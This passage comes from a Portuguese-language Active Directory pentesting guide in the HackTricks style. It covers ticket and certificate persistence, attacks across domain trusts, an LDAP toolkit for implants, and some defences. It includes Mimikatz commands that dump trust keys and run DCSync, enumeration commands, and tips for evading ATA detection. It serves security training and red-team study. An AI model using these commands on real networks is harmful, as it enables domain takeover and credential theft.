{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

São como golden tickets forjados de uma forma que **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Ter certificados de uma conta ou poder solicitá-los** é uma excelente forma de persistir na conta do usuário (mesmo se ele mudar a senha):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Usar certificados também possibilita persistir com high privileges dentro do domínio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

O objeto **AdminSDHolder** no Active Directory assegura a segurança de **grupos privilegiados** (como Domain Admins e Enterprise Admins) aplicando uma **Access Control List (ACL)** padrão nesses grupos para prevenir alterações não autorizadas. No entanto, esse recurso pode ser explorado; se um atacante modificar a ACL do AdminSDHolder para dar acesso total a um usuário comum, esse usuário ganha controle extenso sobre todos os grupos privilegiados. Esta medida de segurança, destinada a proteção, pode portanto se inverter, permitindo acesso indevido a menos que seja monitorada de perto.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Dentro de cada **Domain Controller (DC)** existe uma conta **local administrator**. Ao obter privilégios de admin em tal máquina, o hash do Administrator local pode ser extraído usando **mimikatz**. Em seguida, é necessária uma modificação no registro para **habilitar o uso dessa senha**, permitindo acesso remoto à conta Administrator local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Você poderia **dar** algumas **permissões especiais** a um **usuário** sobre certos objetos específicos do domínio que permitirão ao usuário **escalar privilégios no futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Os **security descriptors** são usados para **armazenar** as **permissões** que um **objeto** tem **sobre** um objeto. Se você puder apenas **fazer** uma **pequena alteração** no **security descriptor** de um objeto, você pode obter privilégios muito interessantes sobre esse objeto sem precisar ser membro de um grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Altere a **LSASS** na memória para estabelecer uma **senha universal**, concedendo acesso a todas as contas do domínio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Ele registra um **novo Domain Controller** no AD e o usa para **push attributes** (SIDHistory, SPNs...) em objetos especificados **without** deixar quaisquer **logs** referentes às **modificações**. Você **need DA** privileges e precisa estar dentro do **root domain**.\
Note que se você usar dados incorretos, aparecerão logs bem feios.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Anteriormente discutimos como escalar privilégios se você tiver **enough permission to read LAPS passwords**. No entanto, essas senhas também podem ser usadas para **maintain persistence**.\
Check:


{{#ref}}
laps.md
{{#endref}}

## Escalada de Privilégios na Floresta - Domain Trusts

A Microsoft vê a **Forest** como o limite de segurança. Isto implica que **comprometer um único domínio pode potencialmente levar ao comprometimento de toda a Floresta**.

### Basic Information

Um [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) é um mecanismo de segurança que permite a um usuário de um **domain** acessar recursos em outro **domain**. Essencialmente cria uma ligação entre os sistemas de autenticação dos dois domínios, permitindo que as verificações de autenticação fluam de forma transparente. Quando domínios estabelecem uma trust, eles trocam e retêm chaves específicas dentro de seus **Domain Controllers (DCs)**, que são cruciais para a integridade da trust.

Em um cenário típico, se um usuário deseja acessar um serviço em um **trusted domain**, ele deve primeiro solicitar um ticket especial conhecido como **inter-realm TGT** ao DC de seu próprio domínio. Esse TGT é criptografado com uma **trust key** compartilhada que ambos os domínios acordaram. O usuário então apresenta esse TGT ao **DC do trusted domain** para obter um ticket de serviço (**TGS**). Após a validação do inter-realm TGT pelo DC do trusted domain, ele emite um TGS, concedendo ao usuário acesso ao serviço.

**Steps**:

1. Um **client computer** em **Domain 1** inicia o processo usando seu **NTLM hash** para solicitar um **Ticket Granting Ticket (TGT)** ao seu **Domain Controller (DC1)**.
2. DC1 emite um novo TGT se o cliente for autenticado com sucesso.
3. O cliente então solicita um **inter-realm TGT** ao DC1, que é necessário para acessar recursos em **Domain 2**.
4. O inter-realm TGT é criptografado com uma **trust key** compartilhada entre DC1 e DC2 como parte da trust bidirecional entre domínios.
5. O cliente leva o inter-realm TGT ao **Domain Controller de Domain 2 (DC2)**.
6. DC2 verifica o inter-realm TGT usando sua trust key compartilhada e, se válido, emite um **Ticket Granting Service (TGS)** para o servidor em Domain 2 que o cliente deseja acessar.
7. Finalmente, o cliente apresenta esse TGS ao servidor, que está criptografado com o hash da conta do servidor, para obter acesso ao serviço em Domain 2.

### Different trusts

É importante notar que **uma trust pode ser 1 way ou 2 ways**. Na opção de 2 ways, ambos os domínios confiarão um no outro, mas na relação de **1 way** um dos domínios será o **trusted** e o outro o **trusting**. Neste último caso, **você só poderá acessar recursos dentro do trusting domain a partir do trusted**.

Se Domain A trusts Domain B, A é o trusting domain e B é o trusted. Além disso, em **Domain A**, isso seria uma **Outbound trust**; e em **Domain B**, isso seria uma **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Esta é uma configuração comum dentro da mesma floresta, onde um child domain automaticamente tem uma trust transitiva de duas vias com seu parent domain. Essencialmente, isso significa que pedidos de autenticação podem fluir sem problemas entre o parent e o child.
- **Cross-link Trusts**: Referidas como "shortcut trusts", são estabelecidas entre child domains para acelerar processos de referral. Em florestas complexas, os referrals de autenticação normalmente precisam subir até a raiz da floresta e então descer até o domínio alvo. Criando cross-links, a jornada é encurtada, o que é especialmente benéfico em ambientes geograficamente dispersos.
- **External Trusts**: São configuradas entre domínios diferentes e não relacionados e são não-transitivas por natureza. Segundo a [documentação da Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts são úteis para acessar recursos em um domínio fora da floresta atual que não esteja ligado por uma forest trust. A segurança é reforçada através de SID filtering com external trusts.
- **Tree-root Trusts**: Essas trusts são automaticamente estabelecidas entre o forest root domain e uma nova tree root adicionada. Embora não sejam comumente encontradas, tree-root trusts são importantes para adicionar novas árvores de domínio a uma floresta, permitindo que mantenham um nome de domínio único e assegurando transitividade bidirecional. Mais informações podem ser encontradas no [guia da Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Este tipo de trust é uma trust transitive de duas vias entre dois forest root domains, também aplicando SID filtering para aumentar medidas de segurança.
- **MIT Trusts**: Essas trusts são estabelecidas com domínios Kerberos não-Windows, compatíveis com [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts são um pouco mais especializadas e atendem ambientes que exigem integração com sistemas baseados em Kerberos fora do ecossistema Windows.

#### Other differences in **trusting relationships**

- Uma relação de trust também pode ser **transitive** (A trusts B, B trusts C, então A trusts C) ou **non-transitive**.
- Uma relação de trust pode ser configurada como **bidirectional trust** (ambos confiam um no outro) ou como **one-way trust** (apenas um confia no outro).

### Attack Path

1. **Enumerar** as relações de confiança
2. Verificar se algum **security principal** (user/group/computer) tem **access** a recursos do **outro domínio**, talvez por entradas ACE ou por estar em grupos do outro domínio. Procurar **relationships across domains** (a trust provavelmente foi criada para isso).
1. kerberoast neste caso poderia ser outra opção.
3. **Comprometer** as **contas** que podem **pivotar** através dos domínios.

Atacantes com acesso a recursos em outro domínio podem alcançá-lo através de três mecanismos principais:

- **Local Group Membership**: Principals podem ser adicionados a grupos locais em máquinas, como o grupo “Administrators” em um servidor, concedendo-lhes controle significativo sobre essa máquina.
- **Foreign Domain Group Membership**: Principals também podem ser membros de grupos dentro do domínio estrangeiro. Entretanto, a efetividade deste método depende da natureza da trust e do escopo do grupo.
- **Access Control Lists (ACLs)**: Principals podem estar especificados em uma **ACL**, particularmente como entidades em **ACEs** dentro de uma **DACL**, concedendo-lhes acesso a recursos específicos. Para quem deseja se aprofundar na mecânica de ACLs, DACLs e ACEs, o whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” é um recurso inestimável.

### Encontrar usuários/grupos externos com permissões

Você pode checar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar foreign security principals no domínio. Estes serão user/group de **um domínio/forest externa**.

Você pode checar isso no **Bloodhound** ou usando o powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Outras maneiras de enumerar relações de confiança do domínio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Existem **2 trusted keys**, uma para _Child --> Parent_ e outra para _Parent_ --> _Child_.\
> Você pode verificar qual é usada pelo domínio atual com:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalar para Enterprise Admin no child/parent domain abusando da trust com SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Compreender como o Configuration Naming Context (NC) pode ser explorado é crucial. O Configuration NC serve como um repositório central para dados de configuração através de uma forest em ambientes Active Directory (AD). Esses dados são replicados para cada Domain Controller (DC) dentro da forest, com writable DCs mantendo uma cópia writeable do Configuration NC. Para explorar isso, é necessário ter **SYSTEM privileges on a DC**, preferencialmente um child DC.

**Link GPO to root DC site**

O container Sites do Configuration NC inclui informações sobre os sites de todos os computadores juntados ao domínio dentro da AD forest. Operando com SYSTEM privileges on any DC, atacantes podem linkar GPOs aos root DC sites. Essa ação potencialmente compromete o root domain manipulando policies aplicadas a esses sites.

Para informações aprofundadas, pode-se explorar a pesquisa sobre [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Um vetor de ataque envolve mirar em gMSAs privilegiadas dentro do domain. A KDS Root key, essencial para calcular as passwords das gMSAs, é armazenada dentro do Configuration NC. Com SYSTEM privileges on any DC, é possível acessar a KDS Root key e calcular as passwords de qualquer gMSA através da forest.

Análises detalhadas e guias passo a passo podem ser encontrados em:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementar delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Pesquisa externa adicional: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Este método requer paciência, aguardando a criação de novos objetos AD privilegiados. Com SYSTEM privileges, um atacante pode modificar o AD Schema para conceder a qualquer usuário controle total sobre todas as classes. Isso pode levar a acesso e controle não autorizados sobre objetos AD recém-criados.

Leituras adicionais estão disponíveis em [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

A vulnerabilidade ADCS ESC5 mira no controle sobre objetos de Public Key Infrastructure (PKI) para criar um certificate template que possibilita autenticar-se como qualquer usuário dentro da forest. Como objetos PKI residem no Configuration NC, comprometer um writable child DC permite a execução de ataques ESC5.

Mais detalhes podem ser lidos em [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Em cenários sem ADCS, o atacante tem a capacidade de configurar os componentes necessários, como discutido em [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Neste cenário **o seu domínio é confiado** por um domínio externo, que lhe concede **permissões indeterminadas** sobre ele. Você precisará descobrir **quais principals do seu domínio têm qual acesso sobre o domínio externo** e então tentar explorá-lo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domínio de Floresta Externa - Unidirecional (Saída)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Neste cenário **seu domínio** está **confiando** alguns **privilégios** a um principal de **domínios diferentes**.

No entanto, quando um **domínio é confiado** pelo domínio que confia, o domínio confiado **cria um usuário** com um **nome previsível** que usa como **senha a senha de confiança**. Isso significa que é possível **acessar um usuário do domínio que confia para entrar no domínio confiado** para enumerá‑lo e tentar escalar mais privilégios:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Outra forma de comprometer o domínio confiado é encontrar um [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) criado na **direção oposta** da trust de domínio (o que não é muito comum).

Outra forma de comprometer o domínio confiado é aguardar em uma máquina à qual um **usuário do domínio confiado pode acessar** para fazer login via **RDP**. Então, o atacante poderia injetar código no processo da sessão RDP e **acessar o domínio de origem da vítima** a partir daí.\
Além disso, se a **vítima montou seu disco rígido**, a partir do processo da **sessão RDP** o atacante poderia armazenar **backdoors** na **pasta de inicialização do disco rígido**. Essa técnica é chamada **RDPInception.**

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigação do abuso de confiança de domínio

### **SID Filtering:**

- O risco de ataques que exploram o atributo SID history através de trusts entre florestas é mitigado pelo SID Filtering, que é ativado por padrão em todas as relações de confiança entre florestas. Isso se baseia na suposição de que as relações de confiança intra-floresta são seguras, considerando a floresta, em vez do domínio, como o limite de segurança, segundo a posição da Microsoft.
- No entanto, há uma ressalva: o SID Filtering pode interromper aplicações e o acesso de usuários, levando à sua desativação ocasional.

### **Selective Authentication:**

- Para relações de confiança entre florestas, empregar o Selective Authentication garante que usuários das duas florestas não sejam autenticados automaticamente. Em vez disso, permissões explícitas são necessárias para que usuários acessem domínios e servidores dentro do domínio ou floresta que confia.
- É importante observar que essas medidas não protegem contra a exploração do writable Configuration Naming Context (NC) ou ataques à conta de trust.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Abuso do AD baseado em LDAP a partir de implants no host

A [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) reimplementa primitivas LDAP estilo bloodyAD como x64 Beacon Object Files que rodam inteiramente dentro de um on-host implant (por exemplo, Adaptix C2). Operadores compilam o pacote com `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, carregam `ldap.axs`, e então chamam `ldap <subcommand>` do beacon. Todo o tráfego usa o contexto de segurança do logon atual sobre LDAP (389) com signing/sealing ou LDAPS (636) com auto confiança de certificado, então não são necessários proxies socks nem artefatos em disco.

### Enumeração LDAP do lado do implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolvem nomes curtos/caminhos de OU em DNs completos e despejam os objetos correspondentes.
- `get-object`, `get-attribute`, and `get-domaininfo` extraem atributos arbitrários (incluindo security descriptors) além dos metadados de floresta/domínio de `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expõem candidatos a roasting, configurações de delegação, e descritores existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) diretamente do LDAP.
- `get-acl` and `get-writable --detailed` analisam o DACL para listar trustees, direitos (GenericAll/WriteDACL/WriteOwner/escritas de atributos) e herança, fornecendo alvos imediatos para escalada de privilégios via ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) let the operator stage new principals or machine accounts wherever OU rights exist. `add-groupmember`, `set-password`, `add-attribute`, and `set-attribute` directly hijack targets once write-property rights are found.
- ACL-focused commands such as `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, and `add-dcsync` translate WriteDACL/WriteOwner on any AD object into password resets, group membership control, or DCSync replication privileges without leaving PowerShell/ADSI artifacts. `remove-*` counterparts clean up injected ACEs.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` instantly make a compromised user Kerberoastable; `add-asreproastable` (UAC toggle) marks it for AS-REP roasting without touching the password.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) rewrite `msDS-AllowedToDelegateTo`, UAC flags, or `msDS-AllowedToActOnBehalfOfOtherIdentity` from the beacon, enabling constrained/unconstrained/RBCD attack paths and eliminating the need for remote PowerShell or RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` injects privileged SIDs into a controlled principal’s SID history (see [SID-History Injection](sid-history-injection.md)), providing stealthy access inheritance fully over LDAP/LDAPS.
- `move-object` changes the DN/OU of computers or users, letting an attacker drag assets into OUs where delegated rights already exist before abusing `set-password`, `add-groupmember`, or `add-spn`.
- Tightly scoped removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) allow rapid rollback after the operator harvests credentials or persistence, minimizing telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algumas Defesas Gerais

[**Saiba mais sobre como proteger credenciais aqui.**](../stealing-credentials/credentials-protections.md)

### **Medidas defensivas para proteção de credenciais**

- **Domain Admins Restrictions**: Recomenda-se que Domain Admins só tenham permissão para logar nos Domain Controllers, evitando seu uso em outros hosts.
- **Service Account Privileges**: Serviços não devem rodar com privilégios de Domain Admin (DA) para manter a segurança.
- **Temporal Privilege Limitation**: Para tarefas que requerem privilégios de DA, a duração deve ser limitada. Isso pode ser feito com: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audite os Event IDs 2889/3074/3075 e então force LDAP signing além de LDAPS channel binding em DCs/clients para bloquear tentativas de LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementando técnicas de Deception**

- Implementar deception envolve criar armadilhas, como usuários ou computadores isca, com características como senhas que não expiram ou marcados como Trusted for Delegation. Uma abordagem detalhada inclui criar usuários com direitos específicos ou adicioná-los a grupos de alto privilégio.
- Um exemplo prático envolve usar ferramentas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Mais sobre deploy de técnicas de deception pode ser encontrado em [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificando Deception**

- **For User Objects**: Indicadores suspeitos incluem ObjectSID atípico, logons pouco frequentes, datas de criação e baixa contagem de senhas incorretas.
- **General Indicators**: Comparar atributos de possíveis objetos isca com os de objetos genuínos pode revelar inconsistências. Ferramentas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) podem ajudar a identificar tais deceptions.

### **Contornando sistemas de detecção**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Evitar enumeração de sessões nos Domain Controllers para prevenir a detecção pelo ATA.
- **Ticket Impersonation**: Utilizar chaves **aes** para criação de tickets ajuda a evadir detecção por não fazer downgrade para NTLM.
- **DCSync Attacks**: Executar de um host que não seja Domain Controller para evitar detecção do ATA é recomendado, já que execução direta a partir de um Domain Controller irá gerar alertas.

## Referências

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
